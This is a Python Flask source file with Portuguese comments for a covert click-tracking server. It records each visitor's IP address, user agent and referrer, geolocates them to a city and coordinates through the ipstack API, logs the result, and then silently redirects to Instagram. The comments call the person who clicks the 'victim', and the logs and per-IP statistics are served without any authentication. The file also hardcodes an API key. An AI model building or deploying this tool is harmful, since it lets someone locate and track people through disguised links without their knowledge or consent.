from flask import Flask, request, redirect, jsonify
import requests
import os
import csv
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURAÇÃO OBRIGATÓRIA ---
# Obtenha uma chave GRATUITA em https://ipstack.com/signup_free
API_KEY = "381f44000a003435a40949e702c7d0d7"  # <<< SUBSTITUA ISSO!
API_URL = "http://api.ipstack.com/"

# A URL para a qual você quer redirecionar a vítima após rastrear o clique
URL_DESTINO = "https://www.instagram.com/"

# Nome do arquivo para salvar os logs
ARQUIVO_LOG = "clicks.log"
# --- FIM DA CONFIGURAÇÃO ---

def init_log():
    """Cria o arquivo de log com cabeçalho se não existir."""
    try:
        # Verifica se o arquivo existe e se está vazio
        if not os.path.exists(ARQUIVO_LOG) or os.path.getsize(ARQUIVO_LOG) == 0:
            with open(ARQUIVO_LOG, 'w', encoding='utf-8') as f:
                f.write("Timestamp,IP,User Agent,Referrer,Latitude,Longitude,Cidade,Região,País,Campanha\n")
    except IOError as e:
        print(f"Erro ao criar arquivo de log: {e}")

@app.route('/')
def index():
    return """
    <h1>Servidor de Rastreamento Ativo</h1>
    <p>Use um endpoint como '/track/minha_campanha'.</p>
    <h2>Endpoints disponíveis:</h2>
    <ul>
        <li><a href="/track/teste">/track/teste</a> - Rastrear clique</li>
        <li><a href="/logs">/logs</a> - Ver logs em JSON</li>
        <li><a href="/logs/csv">/logs/csv</a> - Baixar logs em CSV</li>
        <li><a href="/stats">/stats</a> - Estatísticas dos cliques</li>
        <li><a href="/debug">/debug</a> - Debug de headers e IP</li>
    </ul>
    """

@app.route('/debug')
def debug():
    """Rota de debug para verificar headers e IPs."""
    real_ip = get_real_ip()
    remote_addr = request.remote_addr
    
    headers_info = {}
    for header, value in request.headers:
        headers_info[header] = value
    
    return jsonify({
        'real_ip_detected': real_ip,
        'remote_addr': remote_addr,
        'all_headers': headers_info,
        'user_agent': request.headers.get('User-Agent', 'N/A'),
        'referer': request.headers.get('Referer', 'N/A')
    })

def get_real_ip():
    """Obtém o IP real do usuário, considerando proxies e load balancers."""
    # Lista de headers que podem conter o IP real
    ip_headers = [
        'X-Forwarded-For',
        'X-Real-IP', 
        'X-Forwarded',
        'Forwarded-For',
        'Forwarded',
        'CF-Connecting-IP',  # Cloudflare
        'True-Client-IP',    # Cloudflare Enterprise
        'X-Client-IP',
        'X-Cluster-Client-IP'
    ]
    
    # Verifica cada header
    for header in ip_headers:
        ip = request.headers.get(header)
        if ip:
            # X-Forwarded-For pode ter múltiplos IPs separados por vírgula
            # O primeiro é geralmente o IP original do cliente
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            
            # Verifica se é um IP válido (não localhost, não privado)
            if ip and ip not in ['127.0.0.1', '::1', 'localhost']:
                return ip
    
    # Fallback para o IP direto
    return request.remote_addr

@app.route('/track/<campaign_id>')
def track(campaign_id):
    """Rota principal que captura os dados e redireciona."""
    # 1. Captura dados básicos da requisição
    victim_ip = get_real_ip()
    user_agent = request.headers.get('User-Agent', 'N/A')
    referrer = request.headers.get('Referer', 'N/A')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 2. Tenta obter a localização geográfica via API
    latitude, longitude, city, region, country = get_geolocation(victim_ip)

    # 3. Prepara os dados para salvar (substitui vírgulas para evitar conflito no CSV)
    user_agent_clean = user_agent.replace(',', ';').replace('\n', ' ')
    referrer_clean = referrer.replace(',', ';').replace('\n', ' ')

    # 4. Formata a linha para o arquivo CSV
    log_line = f'"{timestamp}","{victim_ip}","{user_agent_clean}","{referrer_clean}","{latitude}","{longitude}","{city}","{region}","{country}","{campaign_id}"\n'

    # 5. Salva no arquivo de log
    save_to_file(log_line)

    # 6. Imprime os dados no terminal (feedback imediato)
    print(f"\n--- Clique Registrado ---")
    print(f"Timestamp: {timestamp}")
    print(f"IP: {victim_ip}")
    print(f"Localização: {city}, {region} - {country} ({latitude}, {longitude})")
    print(f"User Agent: {user_agent}")
    print(f"Campanha: {campaign_id}")
    print("------------------------")

    # 7. Redireciona o usuário para o destino final
    return redirect(URL_DESTINO)

def get_geolocation(ip):
    """Consulta a API IPStack para obter dados de localização."""
    # IPs locais e privados não podem ser geolocalizados
    if (ip in ['127.0.0.1', 'localhost', '::1'] or 
        ip.startswith('192.168.') or 
        ip.startswith('10.') or 
        ip.startswith('172.') or
        ip.startswith('169.254.') or  # Link-local
        ip == '0.0.0.0'):
        print(f"IP local/privado detectado ({ip}): geolocalização não disponível")
        return ('Local', 'Local', 'Rede Local', 'Rede Local', 'Rede Local')
    
    try:
        print(f"Consultando geolocalização para IP: {ip}")
        # Para a versão free, use http. Para planos pagos, você pode usar https
        response = requests.get(f"{API_URL}{ip}?access_key={API_KEY}", timeout=10)
        
        print(f"Status da resposta: {response.status_code}")
        
        if response.status_code != 200:
            print(f"Erro na API: Status {response.status_code}")
            return ('Erro API', 'Erro API', 'Erro API', 'Erro API', 'Erro API')
        
        data = response.json()
        print(f"Resposta da API: {data}")
        
        # Verifica se há erro na resposta da API
        if 'error' in data:
            print(f"Erro da API IPStack: {data['error']}")
            return ('Erro API', 'Erro API', 'Erro API', 'Erro API', 'Erro API')
        
        # Retorna os dados relevantes, tratando possíveis valores nulos
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        city = data.get('city')
        region = data.get('region_name')
        country = data.get('country_name')
        
        return (
            str(latitude) if latitude is not None else 'N/A',
            str(longitude) if longitude is not None else 'N/A',
            str(city) if city is not None else 'N/A',
            str(region) if region is not None else 'N/A',
            str(country) if country is not None else 'N/A'
        )
    except Exception as e:
        print(f"Erro ao consultar geolocalização: {e}")
        return ('Erro', 'Erro', 'Erro', 'Erro', 'Erro')

def save_to_file(log_line):
    """Salva os dados capturados no arquivo de log."""
    try:
        with open(ARQUIVO_LOG, 'a', encoding='utf-8') as f:
            f.write(log_line)
    except IOError as e:
        print(f"Erro ao salvar no arquivo de log: {e}")

def read_logs():
    """Lê todos os logs do arquivo e retorna como lista de dicionários."""
    logs = []
    try:
        if not os.path.exists(ARQUIVO_LOG):
            return logs
            
        with open(ARQUIVO_LOG, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                logs.append(row)
    except Exception as e:
        print(f"Erro ao ler logs: {e}")
    return logs

@app.route('/logs')
def view_logs():
    """Rota para visualizar os logs em formato JSON."""
    logs = read_logs()
    return jsonify({
        'status': 'success',
        'total_clicks': len(logs),
        'logs': logs
    })

@app.route('/logs/csv')
def download_logs():
    """Rota para baixar os logs em formato CSV."""
    try:
        if not os.path.exists(ARQUIVO_LOG):
            return jsonify({'error': 'Arquivo de log não encontrado'}), 404
            
        from flask import send_file
        return send_file(ARQUIVO_LOG, as_attachment=True, download_name='clicks_log.csv')
    except Exception as e:
        return jsonify({'error': f'Erro ao baixar arquivo: {str(e)}'}), 500

@app.route('/stats')
def view_stats():
    """Rota para visualizar estatísticas dos cliques."""
    logs = read_logs()
    
    if not logs:
        return jsonify({
            'status': 'success',
            'message': 'Nenhum clique registrado ainda',
            'stats': {
                'total_clicks': 0,
                'campaigns': {},
                'countries': {},
                'cities': {},
                'ips': {}
            }
        })
    
    # Estatísticas
    campaigns = {}
    countries = {}
    cities = {}
    ips = {}
    
    for log in logs:
        # Conta campanhas
        campaign = log.get('Campanha', 'N/A')
        campaigns[campaign] = campaigns.get(campaign, 0) + 1
        
        # Conta países
        country = log.get('País', 'N/A')
        countries[country] = countries.get(country, 0) + 1
        
        # Conta cidades
        city = log.get('Cidade', 'N/A')
        if city != 'N/A':
            cities[city] = cities.get(city, 0) + 1
        
        # Conta IPs
        ip = log.get('IP', 'N/A')
        ips[ip] = ips.get(ip, 0) + 1
    
    return jsonify({
        'status': 'success',
        'stats': {
            'total_clicks': len(logs),
            'campaigns': campaigns,
            'countries': countries,
            'cities': cities,
            'unique_ips': len(ips),
            'ip_frequency': ips
        }
    })

if __name__ == '__main__':
    # Inicializa o arquivo de log antes de rodar o servidor
    init_log()
    print("[+] Arquivo de log inicializado.")
    print("[+] Servidor de rastreamento iniciando...")
    print(f"[+] URL de destino configurada: {URL_DESTINO}")
    print(f"[+] Logs serão salvos em: {ARQUIVO_LOG}")
    print("[+] Aguardando cliques...\n")
    # 'debug=True' é útil para desenvolvimento, mas NÃO use em produção.
    app.run(host='0.0.0.0', port=5000, debug=False)
